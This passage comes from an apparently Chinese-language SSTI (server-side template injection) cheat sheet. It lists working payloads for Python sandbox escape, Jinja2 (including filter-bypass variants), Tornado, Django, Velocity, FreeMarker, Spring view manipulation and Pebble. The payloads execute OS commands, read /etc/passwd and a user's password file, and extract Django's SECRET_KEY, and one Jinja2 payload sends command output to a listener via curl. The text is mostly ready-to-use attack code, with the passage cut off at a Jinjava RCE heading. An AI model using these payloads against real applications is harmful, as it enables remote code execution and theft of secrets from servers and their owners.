    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><pre tabindex="0"><code>&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()</code></pre><h4 id="__import__中ospy2不行" class="heading-element"><span><code>__import__</code>中os(py2不行)</span>
  <a href="#__import__%e4%b8%adospy2%e4%b8%8d%e8%a1%8c" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">75</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span></span></span></code></pre></div><h3 id="1jinjia2" class="heading-element"><span>1.Jinjia2</span>
  <a href="#1jinjia2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>以Django的模板为模型的，是Flask框架的一部分。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;catch_warnings&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">c</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">values</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">b</span><span class="o">.</span><span class="vm">__class__</span> <span class="o">==</span> <span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="s1">&#39;eval&#39;</span> <span class="ow">in</span> <span class="n">b</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;whoami&#34;).read()&#39;</span><span class="p">))</span></span></span></code></pre></div><p>以上payload转为jinjis2：</p>
<pre tabindex="0"><code class="language-jinja2" data-lang="jinja2">{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == &#39;catch_warnings&#39; %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if &#39;eval&#39; in b.keys() %}
      {{ b[&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;whoami&#34;).read()&#39;) }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}</code></pre><h4 id="绕过" class="heading-element"><span>绕过</span>
  <a href="#%e7%bb%95%e8%bf%87" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>过滤<code>[</code>:</p>
<pre tabindex="0"><code class="language-jinja2" data-lang="jinja2">{# getitem、pop #}
{{ &#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read() }}
{{ &#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&#39;ls&#39;).read() }}</code></pre><p>过滤``:</p>
<pre tabindex="0"><code class="language-jinja2" data-lang="jinja2">{# chr函数 #}
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}#request对象
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&amp;path=/etc/passwd

{# 命令执行 #}
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&amp;cmd=id</code></pre><p>过滤下划线：(使用<code>request.args</code>)</p>
<pre tabindex="0"><code class="language-jinja2" data-lang="jinja2">{{&#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;/etc/passwd&#39;).read() }}</code></pre><p>过滤花括号：</p>
<pre tabindex="0"><code class="language-jinja2" data-lang="jinja2">##用{%%}标记
{% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http://127.0.0.1:7999/?i=`whoami`&#39;).read()==&#39;p&#39; %}1{% endif %}</code></pre><h3 id="2tornado" class="heading-element"><span>2.tornado</span>
  <a href="#2tornado" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过<code>{{}}</code>进行传递变量和执行简单的表达式。</p>
<p>payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="kn">import</span> <span class="nn">foobar</span> <span class="o">%</span><span class="p">}</span> <span class="o">=</span> <span class="n">Error</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="kn">import</span> <span class="nn">os</span> <span class="o">%</span><span class="p">}{{</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)}}</span></span></span></code></pre></div><h3 id="3djanjo" class="heading-element"><span>3.Djanjo</span>
  <a href="#3djanjo" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>这个比较难利用，条件被限制的很死，很难执行命令；但Django自带的应用 &ldquo;admin&rdquo;（也就是Django自带的后台）的<code>models.py</code>中导入了当前网站的配置文件，可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-django" data-lang="django"><span class="line"><span class="cl"><span class="x">{user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}
</span></span></span><span class="line"><span class="cl"><span class="x">{user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}</span></span></span></code></pre></div><h2 id="3java中ssti" class="heading-element"><span>3.Java中ssti</span>
  <a href="#3java%e4%b8%adssti" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 id="1velocity" class="heading-element"><span>1.Velocity</span>
  <a href="#1velocity" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code class="language-velocity" data-lang="velocity">##set($e=&#34;e&#34;);$e.getClass().forName(&#34;java.lang.Runtime&#34;).getMethod(&#34;getRuntime&#34;,null).invoke(null,null).exec(&#34;calc&#34;)$class.inspect(&#34;java.lang.Runtime&#34;).type.getRuntime().exec(&#34;sleep 5&#34;).waitFor()    // CVE-2019-3396
##set($str=$class.inspect(&#34;java.lang.String&#34;).type)
##set($chr=$class.inspect(&#34;java.lang.Character&#34;).type)
##set($ex=$class.inspect(&#34;java.lang.Runtime&#34;).type.getRuntime().exec(&#34;whoami&#34;))
$ex.waitFor()
##set($out=$ex.getInputStream())
##foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
##end</code></pre><h3 id="2freemarker" class="heading-element"><span>2.FreeMarker</span>
  <a href="#2freemarker" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">49</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">49</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">$</span><span class="p">{</span><span class="n">7</span><span class="o">*</span><span class="n">7</span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">49</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">##</span><span class="p">{</span><span class="n">7</span><span class="o">*</span><span class="n">7</span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">49</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="p">(</span><span class="n">legacy</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">$</span><span class="p">{</span><span class="n">7</span><span class="o">*</span><span class="sc">&#39;7&#39;</span><span class="p">}</span><span class="w"> </span><span class="n">Nothing</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">$</span><span class="p">{</span><span class="n">foobar</span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span><span class="w"> </span><span class="n">ex</span><span class="o">=</span><span class="s">&#34;freemarker.template.utility.Execute&#34;</span><span class="w"> </span><span class="o">?</span><span class="k">new</span><span class="p">()</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="o">&gt;</span><span class="n">$</span><span class="p">{</span><span class="w"> </span><span class="n">ex</span><span class="p">(</span><span class="s">&#34;id&#34;</span><span class="p">)}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">[</span><span class="err">#</span><span class="n">assign</span><span class="w"> </span><span class="n">ex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="n">freemarker</span><span class="p">.</span><span class="na">template</span><span class="p">.</span><span class="na">utility</span><span class="p">.</span><span class="na">Execute</span><span class="err">&#39;</span><span class="o">?</span><span class="k">new</span><span class="p">()</span><span class="o">]</span><span class="n">$</span><span class="p">{</span><span class="w"> </span><span class="n">ex</span><span class="p">(</span><span class="err">&#39;</span><span class="n">id</span><span class="err">&#39;</span><span class="p">)}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">$</span><span class="p">{</span><span class="s">&#34;freemarker.template.utility.Execute&#34;</span><span class="o">?</span><span class="k">new</span><span class="p">()(</span><span class="s">&#34;id&#34;</span><span class="p">)}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">$</span><span class="p">{</span><span class="n">product</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getProtectionDomain</span><span class="p">().</span><span class="na">getCodeSource</span><span class="p">().</span><span class="na">getLocation</span><span class="p">().</span><span class="na">toURI</span><span class="p">().</span><span class="na">resolve</span><span class="p">(</span><span class="err">&#39;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">carlos</span><span class="o">/</span><span class="n">my_password</span><span class="p">.</span><span class="na">txt</span><span class="err">&#39;</span><span class="p">).</span><span class="na">toURL</span><span class="p">().</span><span class="na">openStream</span><span class="p">().</span><span class="na">readAllBytes</span><span class="p">()</span><span class="o">?</span><span class="n">join</span><span class="p">(</span><span class="s">&#34; &#34;</span><span class="p">)}</span></span></span></code></pre></div><h3 id="3spring-view-manipulation" class="heading-element"><span>3.Spring View Manipulation</span>
  <a href="#3spring-view-manipulation" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">__$</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Scanner</span><span class="p">(</span><span class="n">T</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">).</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;id&#34;</span><span class="p">).</span><span class="na">getInputStream</span><span class="p">()).</span><span class="na">next</span><span class="p">()}</span><span class="n">__</span><span class="p">::.</span><span class="na">x</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">__$</span><span class="p">{</span><span class="n">T</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">).</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;touch executed&#34;</span><span class="p">)}</span><span class="n">__</span><span class="p">::.</span><span class="na">x</span></span></span></code></pre></div><h3 id="4pebble" class="heading-element"><span>4.Pebble</span>
  <a href="#4pebble" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//test</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{{</span><span class="w"> </span><span class="n">someString</span><span class="p">.</span><span class="na">toUPPERCASE</span><span class="p">()</span><span class="w"> </span><span class="p">}}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//低版本</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{{</span><span class="w"> </span><span class="n">variable</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">forName</span><span class="p">(</span><span class="err">&#39;</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="err">&#39;</span><span class="p">).</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="err">&#39;</span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span><span class="err">&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">}}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//高版本</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="o">%</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="n">id</span><span class="err">&#39;</span><span class="w"> </span><span class="o">%</span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="o">%</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">1</span><span class="p">).</span><span class="na">TYPE</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="err">&#39;</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="p">.</span><span class="na">methods</span><span class="o">[</span><span class="n">6</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="p">.</span><span class="na">inputStream</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="p">.</span><span class="na">readAllBytes</span><span class="p">()</span><span class="w"> </span><span class="o">%</span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{{</span><span class="w"> </span><span class="p">(</span><span class="n">1</span><span class="p">).</span><span class="na">TYPE</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="err">&#39;</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">String</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="p">.</span><span class="na">constructors</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="p">.</span><span class="na">newInstance</span><span class="p">((</span><span class="o">[</span><span class="n">bytes</span><span class="o">]</span><span class="p">).</span><span class="na">toArray</span><span class="p">())</span><span class="w"> </span><span class="p">}}</span></span></span></code></pre></div><h3 id="5jinjava" class="heading-element"><span>5.Jinjava</span>
  <a href="#5jinjava" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{{</span><span class="sc">&#39;a&#39;</span><span class="p">.</span><span class="na">toUpperCase</span><span class="p">()}}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;A&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{{</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="p">}}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">会返回一个request对象形如</span><span class="w"> </span><span class="n">com</span><span class="p">.</span><span class="o">[</span><span class="p">...</span><span class="o">]</span><span class="p">.</span><span class="na">context</span><span class="p">.</span><span class="na">TemplateContextRequest</span><span class="nd">@23548206</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//RCE</span><span class="w">
